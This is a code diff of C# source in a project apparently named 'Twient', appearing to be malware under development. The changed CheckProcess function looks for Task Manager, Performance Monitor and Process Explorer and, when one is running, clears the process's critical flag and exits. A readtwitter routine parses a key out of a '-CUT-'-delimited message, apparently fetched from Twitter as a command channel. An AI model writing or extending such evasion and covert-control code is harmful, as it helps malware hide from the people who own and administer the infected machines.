@@ -76,19 +76,15 @@ namespace Twient
 		
 		
 		public static void CheckProcess()
-		{
-			while (true)
+		{			
+			Process[] processesByName = Process.GetProcessesByName("taskmgr");
+			Process[] processesByName2 = Process.GetProcessesByName("perfmon");
+			Process[] processesByName3 = Process.GetProcessesByName("procexp64");
+			if (processesByName.Length > 0 || processesByName2.Length > 0 || processesByName3.Length > 0)
 			{
-				Process[] processesByName = Process.GetProcessesByName("taskmgr");
-				Process[] processesByName2 = Process.GetProcessesByName("perfmon");
-				Process[] processesByName3 = Process.GetProcessesByName("procexp64");
-				if (processesByName.Length > 0 || processesByName2.Length > 0 || processesByName3.Length > 0)
-				{
-					Functions.SetCritical(0);
-					Environment.Exit(0);
-				}
-				Thread.Sleep(2000);
-			}
+				Functions.SetCritical(0);
+				Environment.Exit(0);
+			}		
 		}
 		
 		public static string readtwitter()
@@ -130,7 +126,7 @@ namespace Twient
 			//Console.WriteLine(a);
 			Regex regex = new Regex("-CUT-");
 			string[] cut = regex.Split(msg);
-			key = cut[0];
+			key = cut[0];			
 			if (key=="")
 			{
 				Functions.SetCritical(0);
